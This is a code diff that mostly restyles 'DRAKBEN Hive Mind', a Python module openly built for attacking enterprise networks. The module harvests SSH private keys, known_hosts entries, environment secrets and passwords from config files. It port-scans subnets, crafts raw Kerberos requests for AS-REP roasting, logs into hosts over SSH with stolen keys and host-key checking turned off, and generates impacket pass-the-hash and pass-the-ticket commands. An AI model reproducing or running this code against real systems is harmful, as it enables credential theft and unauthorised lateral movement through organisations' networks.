@@ -1,5 +1,4 @@
-"""
-DRAKBEN Hive Mind - Enterprise Network Intelligence & Lateral Movement
+"""DRAKBEN Hive Mind - Enterprise Network Intelligence & Lateral Movement
 Author: @drak_ben
 Description: Active Directory analysis, lateral movement, and network pivoting.
 
@@ -11,6 +10,7 @@ This module provides:
 - BloodHound-style attack path analysis
 """
 
+import contextlib
 import ipaddress
 import logging
 import os
@@ -19,10 +19,11 @@ import secrets
 import shlex
 import socket
 import subprocess
+from collections.abc import Generator
 from dataclasses import dataclass, field
 from enum import Enum
+from pathlib import Path
 from typing import Any
-import contextlib
 
 logger = logging.getLogger(__name__)
 
@@ -33,7 +34,7 @@ logger = logging.getLogger(__name__)
 
 
 class CredentialType(Enum):
-    """Types of harvested credentials"""
+    """Types of harvested credentials."""
 
     PASSWORD = "password"  # noqa: S105
     NTLM_HASH = "ntlm_hash"
@@ -44,7 +45,7 @@ class CredentialType(Enum):
 
 
 class MovementTechnique(Enum):
-    """Lateral movement techniques"""
+    """Lateral movement techniques."""
 
     PSEXEC = "psexec"
     WMIEXEC = "wmiexec"
@@ -57,7 +58,7 @@ class MovementTechnique(Enum):
 
 
 class ADAttack(Enum):
-    """Active Directory attack types"""
+    """Active Directory attack types."""
 
     KERBEROASTING = "kerberoasting"
     ASREP_ROASTING = "asrep_roasting"
@@ -74,7 +75,7 @@ class ADAttack(Enum):
 
 @dataclass
 class Credential:
-    """Harvested credential"""
+    """Harvested credential."""
 
     username: str
     domain: str
@@ -88,7 +89,7 @@ class Credential:
 
 @dataclass
 class NetworkHost:
-    """Discovered network host"""
+    """Discovered network host."""
 
     ip: str
     hostname: str | None = None
@@ -103,7 +104,7 @@ class NetworkHost:
 
 @dataclass
 class AttackPath:
-    """Path from current position to target"""
+    """Path from current position to target."""
 
     source: str
     target: str
@@ -115,7 +116,7 @@ class AttackPath:
 
 @dataclass
 class DomainInfo:
-    """Active Directory domain information"""
+    """Active Directory domain information."""
 
     name: str
     netbios_name: str
@@ -134,8 +135,7 @@ class DomainInfo:
 
 
 class CredentialHarvester:
-    """
-    Credential harvesting from various sources.
+    """Credential harvesting from various sources.
 
     Sources:
     - Memory (mimikatz-style)
@@ -145,85 +145,83 @@ class CredentialHarvester:
     - Browser storage
     """
 
-    def __init__(self):
+    def __init__(self) -> None:
+        """Initialize the credential harvester with internal storage."""
         self.harvested: list[Credential] = []
-        self.ssh_key_paths = [
-            os.path.expanduser("~/.ssh/id_rsa"),
-            os.path.expanduser("~/.ssh/id_ed25519"),
-            os.path.expanduser("~/.ssh/id_ecdsa"),
-            os.path.expanduser("~/.ssh/id_dsa"),
+        self.patterns: list[str] = [
+            r"password\s*[:=]\s*['\"]?(\S+?)['\"]?\s",
+            r"db_pass\s*[:=]\s*['\"]?(\S+?)['\"]?\s",
+            r"admin_pass\s*[:=]\s*['\"]?(\S+?)['\"]?\s",
+            r"secret\s*[:=]\s*['\"]?(\S+?)['\"]?\s",
+            r"token\s*[:=]\s*['\"]?(\S+?)['\"]?\s",
         ]
 
     def harvest_ssh_keys(self) -> list[Credential]:
-        """
-        Harvest SSH private keys from common locations.
-
-        Returns:
-            List of Credential objects for found keys
-        """
+        """Harvest SSH private keys from common locations."""
         found = []
+        ssh_dir = Path.home() / ".ssh"
 
-        for key_path in self.ssh_key_paths:
-            if os.path.exists(key_path):
-                try:
-                    with open(key_path) as f:
-                        key_content = f.read()
+        if ssh_dir.exists():
+            for key_file in ["id_rsa", "id_ed25519", "id_ecdsa", "id_dsa"]:
+                key_path = ssh_dir / key_file
+                if key_path.exists():
+                    try:
+                        content = key_path.read_text()
 
-                    # Check if it's actually a private key
-                    if "PRIVATE KEY" in key_content:
-                        # Try to get username from known_hosts or config
-                        username = self._get_ssh_username(key_path)
+                        # Check if it's actually a private key
+                        if "PRIVATE KEY" in content:
+                            # Try to get username from known_hosts or config
+                            username = self._get_ssh_username(str(key_path))
 
-                        cred = Credential(
-                            username=username or os.getenv("USER", "unknown"),
-                            domain="",
-                            credential_type=CredentialType.SSH_KEY,
-                            value=key_content,
-                            source=key_path,
-                            metadata={"encrypted": "ENCRYPTED" in key_content},
-                        )
-                        found.append(cred)
-                        self.harvested.append(cred)
-                        logger.info(f"Found SSH key: {key_path}")
+                            cred = Credential(
+                                username=username or os.getenv("USER", "unknown"),
+                                domain="",
+                                credential_type=CredentialType.SSH_KEY,
+                                value=content,
+                                source=str(key_path),
+                                metadata={"encrypted": "ENCRYPTED" in content},
+                            )
+                            found.append(cred)
+                            self.harvested.append(cred)
+                            logger.info("Found SSH key: %s", key_path)
 
-                except PermissionError:
-                    logger.debug(f"Permission denied reading SSH key: {key_path}")
-                except Exception as e:
-                    logger.debug(f"Error reading SSH key {key_path}: {e}")
+                    except PermissionError:
+                        logger.debug("Permission denied reading SSH key: %s", key_path)
+                    except Exception as e:
+                        logger.debug("Error reading SSH key {key_path}: %s", e)
 
         return found
 
     def harvest_known_hosts(self) -> list[str]:
-        """
-        Parse SSH known_hosts for target discovery.
+        """Parse SSH known_hosts for target discovery.
 
         Returns:
             List of hostnames/IPs from known_hosts
+
         """
         hosts = []
-        known_hosts_path = os.path.expanduser("~/.ssh/known_hosts")
+        known_hosts_path = Path.home() / ".ssh" / "known_hosts"
 
-        if os.path.exists(known_hosts_path):
+        if known_hosts_path.exists():
             try:
-                with open(known_hosts_path) as f:
-                    for line in f:
-                        if line.strip() and not line.startswith("#"):
-                            # Format: hostname,ip algo key
-                            parts = line.split()
-                            if parts:
-                                host_part = parts[0].split(",")
-                                hosts.extend(host_part)
+                for line in known_hosts_path.read_text().splitlines():
+                    if line.strip() and not line.startswith("#"):
+                        # Format: hostname,ip algo key
+                        parts = line.split()
+                        if parts:
+                            host_part = parts[0].split(",")
+                            hosts.extend(host_part)
             except Exception as e:
-                logger.debug(f"Error reading known_hosts: {e}")
+                logger.debug("Error reading known_hosts: %s", e)
 
         return list(set(hosts))
 
     def harvest_environment(self) -> list[Credential]:
-        """
-        Harvest credentials from environment variables.
+        """Harvest credentials from environment variables.
 
         Returns:
             List of potential credentials from environment
+
         """
         found = []
         sensitive_patterns = [
@@ -254,13 +252,11 @@ class CredentialHarvester:
 
         return found
 
-    def _parse_config_file(self, filepath: str, password_regex) -> list[Credential]:
-        """Parse a single config file for credentials"""
+    def _parse_config_file(self, filepath: str, password_regex: "re.Pattern") -> list["Credential"]:
+        """Parse a single config file for credentials."""
         found_in_file = []
         try:
-            with open(filepath, errors="ignore") as f:
-                content = f.read(10000)  # First 10KB
-
+            content = Path(filepath).read_text(errors="ignore")
             matches = password_regex.findall(content)
             for match in matches:
                 if len(match) > 3 and match.lower() not in [
@@ -281,29 +277,30 @@ class CredentialHarvester:
             pass
         return found_in_file
 
-    def _get_config_files(self, search_paths: list[str], patterns: list[str]):
-        """Generator for relevant config files"""
+    def _get_config_files(self, search_paths: list[str], patterns: list[str]) -> Generator[str, None, None]:
+        """Generator for relevant config files."""
         for search_path in search_paths:
-            if not os.path.exists(search_path):
+            if not Path(search_path).exists():
                 continue
             for root, dirs, files in os.walk(search_path):
                 dirs[:] = [d for d in dirs if not d.startswith(".")]
                 for filename in files:
-                    filepath = os.path.join(root, filename)
+                    filepath = Path(root) / filename
                     # Simple filter check
                     if any(
-                        filepath.endswith(p.replace("*", "")) for p in patterns
+                        str(filepath).endswith(p.replace("*", "")) for p in patterns
                     ) or any(p.replace("*", "") in filename for p in patterns):
-                        yield filepath
+                        yield str(filepath)
 
-    def harvest_config_files(self, search_paths: list[str] = None) -> list[Credential]:
-        """
-        Search config files for embedded credentials.
+    def harvest_config_files(
+        self, search_paths: list[str] | None = None,
+    ) -> list[Credential]:
+        """Search config files for embedded credentials.
         Architecture: Uses a generator for memory-efficient file discovery and
         centralized parsing to maintain low cognitive complexity.
         """
         if search_paths is None:
-            search_paths = [os.path.expanduser("~")]
+            search_paths = [str(Path.home())]
 
         found = []
         patterns = [
@@ -329,21 +326,22 @@ class CredentialHarvester:
 
         return found
 
-    def _get_ssh_username(self, key_path: str) -> str | None:
-        """Try to determine SSH username from config"""
-        config_path = os.path.join(os.path.dirname(key_path), "config")
-        if os.path.exists(config_path):
-            try:
-                with open(config_path) as f:
-                    for line in f:
-                        if "User " in line:
-                            return line.split("User ")[-1].strip()
-            except Exception as e:
-                logger.debug(f"Failed to read SSH config: {e}")
-        return None
+    def _get_ssh_username(self, key_path: str) -> str:
+        """Try to determine SSH username from config."""
+        try:
+            config_path = Path.home() / ".ssh" / "config"
+            if config_path.exists():
+                # Simple parser for Host * User pattern
+                content = config_path.read_text()
+                for line in content.splitlines():
+                    if line.strip().startswith("User "):
+                        return line.split()[1]
+        except Exception:
+            pass
+        return os.getlogin() if hasattr(os, "getlogin") else "unknown"
 
     def get_all_credentials(self) -> list[Credential]:
-        """Get all harvested credentials"""
+        """Get all harvested credentials."""
         return self.harvested.copy()
 
 
@@ -353,8 +351,7 @@ class CredentialHarvester:
 
 
 class NetworkMapper:
-    """
-    Network topology discovery and mapping.
+    """Network topology discovery and mapping.
 
     Discovers:
     - Local network hosts
@@ -363,12 +360,12 @@ class NetworkMapper:
     - Potential pivot points
     """
 
-    def __init__(self):
+    def __init__(self) -> None:
         self.discovered_hosts: dict[str, NetworkHost] = {}
         self.local_interfaces: list[str] = []
 
     def get_local_interfaces(self) -> list[str]:
-        """Get local network interfaces and their IPs"""
+        """Get local network interfaces and their IPs."""
         interfaces = []
 
         try:
@@ -396,25 +393,26 @@ class NetworkMapper:
                 if primary_ip not in interfaces:
                     interfaces.append(primary_ip)
             except Exception as e:
-                logger.debug(f"Failed to get primary IP: {e}")
+                logger.debug("Failed to get primary IP: %s", e)
 
         except Exception as e:
-            logger.debug(f"Error getting interfaces: {e}")
+            logger.debug("Error getting interfaces: %s", e)
 
         self.local_interfaces = interfaces
         return interfaces
 
     def get_local_subnet(self, ip: str) -> str:
-        """Get the /24 subnet for an IP"""
+        """Get the /24 subnet for an IP."""
         try:
             network = ipaddress.IPv4Network(f"{ip}/24", strict=False)
             return str(network)
         except ValueError:
             return f"{ip}/24"
 
-    def quick_scan(self, target: str, ports: list[int] = None) -> NetworkHost | None:
-        """
-        Quick port scan of a single target.
+    def quick_scan(
+        self, target: str, ports: list[int] | None = None,
+    ) -> NetworkHost | None:
+        """Quick port scan of a single target.
 
         Args:
             target: IP or hostname
@@ -422,6 +420,7 @@ class NetworkMapper:
 
         Returns:
             NetworkHost object or None
+
         """
         if ports is None:
             ports = [22, 80, 135, 139, 443, 445, 3389, 5985, 5986]
@@ -440,7 +439,8 @@ class NetworkMapper:
                     open_ports.append(port)
                     services[port] = self._guess_service(port)
 
-            except Exception:
+            except Exception as e:
+                logger.debug("Service guessing failed for port %s: %s", port, e)
                 continue
 
         if open_ports:
@@ -451,7 +451,7 @@ class NetworkMapper:
         return None
 
     def _guess_service(self, port: int) -> str:
-        """Guess service name from port number"""
+        """Guess service name from port number."""
         common_ports = {
             21: "ftp",
             22: "ssh",
@@ -481,16 +481,16 @@ class NetworkMapper:
         return common_ports.get(port, f"unknown-{port}")
 
     def is_windows_host(self, host: NetworkHost) -> bool:
-        """Check if host appears to be Windows"""
+        """Check if host appears to be Windows."""
         windows_ports = {135, 139, 445, 3389, 5985}
         return bool(set(host.ports) & windows_ports)
 
     def is_linux_host(self, host: NetworkHost) -> bool:
-        """Check if host appears to be Linux"""
+        """Check if host appears to be Linux."""
         return 22 in host.ports and not self.is_windows_host(host)
 
     def find_pivot_points(self) -> list[NetworkHost]:
-        """Find potential pivot points (hosts with multiple network access)"""
+        """Find potential pivot points (hosts with multiple network access)."""
         pivots = []
         for host in self.discovered_hosts.values():
             # Hosts with RDP/SSH and other services are good pivot points
@@ -506,19 +506,17 @@ class NetworkMapper:
 
 
 class KerberosPacketFactory:
-    """
-    Native Python Kerberos Packet Factory.
+    """Native Python Kerberos Packet Factory.
     Constructs raw ASN.1/DER encoded Kerberos packets without external dependencies.
     """
 
     @staticmethod
     def build_as_req(username: str, domain: str) -> bytes:
-        """
-        Builds a minimal raw AS-REQ packet for AS-REP Roasting checks.
+        """Builds a minimal raw AS-REQ packet for AS-REP Roasting checks.
 
         Structure (Simplified RFC4120):
-        AS-REQ ::= [APPLICATION 10] KDC-REQ
-        KDC-REQ ::= SEQUENCE {
+        AS-REQ := [APPLICATION 10] KDC-REQ
+        KDC-REQ := SEQUENCE {
             pvno [1] INTEGER (5),
             msg-type [2] INTEGER (10 -- AS-REQ),
             padata [3] SEQUENCE OF PA-DATA OPTIONAL,
@@ -530,23 +528,22 @@ class KerberosPacketFactory:
         """
 
         # 1. Basic ASN.1 Encoders (Minimalist)
-        def encode_len(length):
+        def encode_len(length: int) -> bytes:
             if length < 128:
                 return bytes([length])
-            else:
-                b = length.to_bytes((length.bit_length() + 7) // 8, "big")
-                return bytes([0x80 | len(b)]) + b
+            b = length.to_bytes((length.bit_length() + 7) // 8, "big")
+            return bytes([0x80 | len(b)]) + b
 
-        def seq(tags, content):
+        def seq(tags: int, content: bytes) -> bytes:
             encoded_length = encode_len(len(content))
             return bytes([tags]) + encoded_length + content
 
-        def int_val(val):
+        def int_val(val: int) -> bytes:
             # Integer encoding
             b = val.to_bytes((val.bit_length() + 7) // 8 + 1, "big", signed=True)
             return seq(0x02, b)  # 0x02 = INTEGER
 
-        def str_val(val):
+        def str_val(val: str) -> bytes:
             # GeneralString encoding
             return seq(0x1B, val.encode("utf-8"))
 
@@ -605,14 +602,11 @@ class KerberosPacketFactory:
         kdc_req = seq(0x30, kdc_req_content)
 
         # 4. Wrap in APPLICATION 10
-        as_req = seq(0x6A, kdc_req)
-
-        return as_req
+        return seq(0x6A, kdc_req)
 
 
 class ADAnalyzer:
-    """
-    Active Directory enumeration and analysis.
+    """Active Directory enumeration and analysis.
 
     Capabilities:
     - Domain enumeration
@@ -622,16 +616,16 @@ class ADAnalyzer:
     - Kerberos attacks
     """
 
-    def __init__(self):
+    def __init__(self) -> None:
         self.domain_info: DomainInfo | None = None
         self.attack_paths: list[AttackPath] = []
 
     def detect_domain(self) -> str | None:
-        """
-        Detect if we're on a domain-joined machine.
+        """Detect if we're on a domain-joined machine.
 
         Returns:
             Domain name or None
+
         """
         # Check environment variables (Windows)
         domain = os.environ.get("USERDOMAIN")
@@ -642,7 +636,7 @@ class ADAnalyzer:
         try:
             with open("/etc/resolv.conf") as f:
                 for line in f:
-                    if line.startswith("search ") or line.startswith("domain "):
+                    if line.startswith(("search ", "domain ")):
                         parts = line.split()
                         if len(parts) > 1:
                             return parts[1]
@@ -652,14 +646,14 @@ class ADAnalyzer:
         return None
 
     def enumerate_domain(self, domain: str) -> DomainInfo | None:
-        """
-        Enumerate Active Directory domain.
+        """Enumerate Active Directory domain.
 
         Args:
             domain: Domain name
 
         Returns:
             DomainInfo object or None
+
         """
         info = DomainInfo(
             name=domain,
@@ -682,17 +676,17 @@ class ADAnalyzer:
                 except socket.gaierror:
                     continue
         except Exception as e:
-            logger.debug(f"Error enumerating DCs: {e}")
+            logger.debug("Error enumerating DCs: %s", e)
 
         self.domain_info = info
         return info
 
     def get_kerberoastable_users(self) -> list[str]:
-        """
-        Get list of potentially kerberoastable users.
+        """Get list of potentially kerberoastable users.
 
         Returns:
             List of usernames with SPNs
+
         """
         # In real implementation, this would query AD for users with SPNs
         # For now, return common service account patterns
@@ -709,19 +703,21 @@ class ADAnalyzer:
         ]
 
     def get_asrep_roastable_users(self) -> list[str]:
-        """
-        Get list of users vulnerable to AS-REP roasting.
+        """Get list of users vulnerable to AS-REP roasting.
 
         Returns:
             List of usernames without pre-auth
+
         """
         return []
 
     def native_check_asrep_roasting(
-        self, domain: str, users: list[str], dc_ip: str
+        self,
+        domain: str,
+        users: list[str],
+        dc_ip: str,
     ) -> list[str]:
-        """
-        Check for AS-REP Roasting using native Python sockets.
+        """Check for AS-REP Roasting using native Python sockets.
         Sends raw AS-REQ without Pre-Auth.
 
         Args:
@@ -731,6 +727,7 @@ class ADAnalyzer:
 
         Returns:
             List of vulnerable users (those who returned AS-REP instead of KRB-ERROR)
+
         """
         vulnerable_users = []
 
@@ -753,11 +750,11 @@ class ADAnalyzer:
                 # KRB-ERROR = Application 30 (0x7E)
                 if data[0] == 0x6B:
                     # We got a Ticket! (Vulnerable)
-                    logger.warning(f"AS-REP Roasting Success: {user} is vulnerable!")
+                    logger.warning("AS-REP Roasting Success: %s is vulnerable!", user)
                     vulnerable_users.append(user)
 
             except Exception as e:
-                logger.debug(f"Roasting check failed for {user}: {e}")
+                logger.debug("Roasting check failed for {user}: %s", e)
 
         return vulnerable_users
 
@@ -768,8 +765,7 @@ class ADAnalyzer:
         available_creds: list[Credential],
         discovered_hosts: dict[str, NetworkHost],
     ) -> AttackPath | None:
-        """
-        Calculate attack path from source to target.
+        """Calculate attack path from source to target.
 
         BloodHound-style shortest path calculation.
 
@@ -781,6 +777,7 @@ class ADAnalyzer:
 
         Returns:
             AttackPath or None if no path found
+
         """
         # Simple path calculation
         # In real implementation, this would use graph algorithms
@@ -837,8 +834,7 @@ class ADAnalyzer:
 
 
 class LateralMover:
-    """
-    Lateral movement execution engine.
+    """Lateral movement execution engine.
 
     Techniques:
     - Pass-the-Hash (PTH)
@@ -848,12 +844,12 @@ class LateralMover:
     - WinRM
     """
 
-    def __init__(self):
+    def __init__(self) -> None:
         self.successful_moves: list[dict[str, Any]] = []
         self.failed_moves: list[dict[str, Any]] = []
 
     def _prepare_ssh_key(self, key_content: str) -> str:
-        """Securely write SSH key to temp file"""
+        """Securely write SSH key to temp file."""
         import tempfile
 
         with tempfile.NamedTemporaryFile(mode="w", delete=False, suffix=".key") as f:
@@ -863,13 +859,18 @@ class LateralMover:
         return key_file
 
     def _execute_ssh(
-        self, cmd_list: list[str], timeout: int = 30
+        self,
+        cmd_list: list[str],
+        timeout: int = 30,
     ) -> tuple[bool, str, str]:
-        """Execute SSH command with subprocess"""
+        """Execute SSH command with subprocess."""
         proc = None
         try:
             proc = subprocess.Popen(
-                cmd_list, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True
+                cmd_list,
+                stdout=subprocess.PIPE,
+                stderr=subprocess.PIPE,
+                text=True,
             )
             stdout, stderr = proc.communicate(timeout=timeout)
             return proc.returncode == 0, stdout, stderr
@@ -882,11 +883,13 @@ class LateralMover:
             return False, "", str(e)
 
     def move_ssh(
-        self, target: str, username: str, credential: Credential, command: str = None
+        self,
+        target: str,
+        username: str,
+        credential: Credential,
+        command: str | None = None,
     ) -> dict[str, Any]:
-        """
-        Move to target via SSH (Refactored for complexity).
-        """
+        """Move to target via SSH (Refactored for complexity)."""
         result = {
             "technique": MovementTechnique.SSH.value,
             "target": target,
@@ -905,11 +908,13 @@ class LateralMover:
         key_file = self._prepare_ssh_key(credential.value)
         try:
             ssh_opts = "-o StrictHostKeyChecking=no -o BatchMode=yes"
-            cmd_list = (
-                ["ssh"]
-                + shlex.split(ssh_opts)
-                + ["-i", key_file, f"{username}@{target}"]
-            )
+            cmd_list = [
+                "ssh",
+                *shlex.split(ssh_opts),
+                "-i",
+                key_file,
+                f"{username}@{target}",
+            ]
             if command:
                 cmd_list.append(command)
 
@@ -933,8 +938,7 @@ class LateralMover:
         ntlm_hash: str,
         technique: MovementTechnique = MovementTechnique.PSEXEC,
     ) -> str:
-        """
-        Generate Pass-the-Hash command for impacket tools.
+        """Generate Pass-the-Hash command for impacket tools.
 
         Args:
             target: Target host
@@ -944,6 +948,7 @@ class LateralMover:
 
         Returns:
             Command string
+
         """
         domain = ""
         if "\\" in username:
@@ -965,8 +970,7 @@ class LateralMover:
         return f"{tool} {user_spec}@{target} -hashes :{ntlm_hash}"
 
     def generate_ptt_command(self, target: str, ticket_path: str) -> str:
-        """
-        Generate Pass-the-Ticket command.
+        """Generate Pass-the-Ticket command.
 
         Args:
             target: Target host
@@ -974,11 +978,12 @@ class LateralMover:
 
         Returns:
             Command string
+
         """
         return f"export KRB5CCNAME={ticket_path} && psexec.py -k -no-pass {target}"
 
     def get_movement_stats(self) -> dict[str, Any]:
-        """Get statistics about movement attempts"""
+        """Get statistics about movement attempts."""
         return {
             "successful": len(self.successful_moves),
             "failed": len(self.failed_moves),
@@ -993,8 +998,7 @@ class LateralMover:
 
 
 class HiveMind:
-    """
-    Main orchestrator for enterprise network intelligence.
+    """Main orchestrator for enterprise network intelligence.
 
     Coordinates:
     - Credential harvesting
@@ -1010,8 +1014,8 @@ class HiveMind:
         hive.execute_movement(paths[0])
     """
 
-    def __init__(self):
-        """Initialize Hive Mind"""
+    def __init__(self) -> None:
+        """Initialize Hive Mind."""
         self.harvester = CredentialHarvester()
         self.mapper = NetworkMapper()
         self.ad_analyzer = ADAnalyzer()
@@ -1023,11 +1027,11 @@ class HiveMind:
         logger.info("Hive Mind initialized")
 
     def initialize(self) -> dict[str, Any]:
-        """
-        Initialize Hive Mind with local reconnaissance.
+        """Initialize Hive Mind with local reconnaissance.
 
         Returns:
             Dict with initialization results
+
         """
         results = {
             "interfaces": [],
@@ -1058,19 +1062,19 @@ class HiveMind:
 
         except Exception as e:
             results["errors"].append(str(e))
-            logger.error(f"Initialization error: {e}")
+            logger.exception("Initialization error: %s", e)
 
         return results
 
-    def scan_network(self, subnet: str = None) -> list[NetworkHost]:
-        """
-        Scan local network for hosts.
+    def scan_network(self, subnet: str | None = None) -> list[NetworkHost]:
+        """Scan local network for hosts.
 
         Args:
             subnet: Subnet to scan (default: auto-detect)
 
         Returns:
             List of discovered hosts
+
         """
         if subnet is None and self.current_host:
             subnet = self.mapper.get_local_subnet(self.current_host)
@@ -1088,19 +1092,19 @@ class HiveMind:
                     if host:
                         discovered.append(host)
             except ValueError as e:
-                logger.error(f"Invalid subnet: {e}")
+                logger.exception("Invalid subnet: %s", e)
 
         return discovered
 
     def find_attack_paths(self, _target: str = "Domain Admin") -> list[AttackPath]:
-        """
-        Find attack paths to target.
+        """Find attack paths to target.
 
         Args:
             target: Target (hostname, IP, or "Domain Admin")
 
         Returns:
             List of possible attack paths
+
         """
         paths = []
 
@@ -1108,7 +1112,7 @@ class HiveMind:
             return paths
 
         # Calculate paths to each discovered host
-        for host_ip, _host in self.mapper.discovered_hosts.items():
+        for host_ip in self.mapper.discovered_hosts:
             path = self.ad_analyzer.calculate_attack_path(
                 source=self.current_host,
                 target=host_ip,
@@ -1124,9 +1128,10 @@ class HiveMind:
         return paths
 
     def _find_matching_credential(
-        self, technique: MovementTechnique
+        self,
+        technique: MovementTechnique,
     ) -> Credential | None:
-        """Find a credential matching the movement technique"""
+        """Find a credential matching the movement technique."""
         for c in self.harvester.harvested:
             if (
                 technique == MovementTechnique.SSH
@@ -1141,9 +1146,12 @@ class HiveMind:
         return None
 
     def _execute_hop(
-        self, hop: str, technique: MovementTechnique, result: dict[str, Any]
+        self,
+        hop: str,
+        technique: MovementTechnique,
+        result: dict[str, Any],
     ) -> bool:
-        """Execute a single hop in the attack path"""
+        """Execute a single hop in the attack path."""
         cred = self._find_matching_credential(technique)
         if not cred:
             result["output"] = f"No suitable credential for {technique.value}"
@@ -1163,9 +1171,7 @@ class HiveMind:
         return False
 
     def execute_movement(self, path: AttackPath) -> dict[str, Any]:
-        """
-        Execute lateral movement along attack path (Refactored for complexity).
-        """
+        """Execute lateral movement along attack path (Refactored for complexity)."""
         result = {
             "path": path,
             "success": False,
@@ -1185,7 +1191,7 @@ class HiveMind:
         return result
 
     def get_status(self) -> dict[str, Any]:
-        """Get current Hive Mind status"""
+        """Get current Hive Mind status."""
         return {
             "initialized": self.initialized,
             "current_host": self.current_host,
@@ -1204,11 +1210,11 @@ class HiveMind:
 
 
 def get_hive_mind() -> HiveMind:
-    """
-    Get singleton HiveMind instance.
+    """Get singleton HiveMind instance.
 
     Returns:
         HiveMind instance
+
     """
     global _hive_mind
     if "_hive_mind" not in globals() or _hive_mind is None:
@@ -1217,11 +1223,11 @@ def get_hive_mind() -> HiveMind:
 
 
 def quick_recon() -> dict[str, Any]:
-    """
-    Quick local reconnaissance.
+    """Quick local reconnaissance.
 
     Returns:
         Dict with recon results
+
     """
     hive = get_hive_mind()
     return hive.initialize()
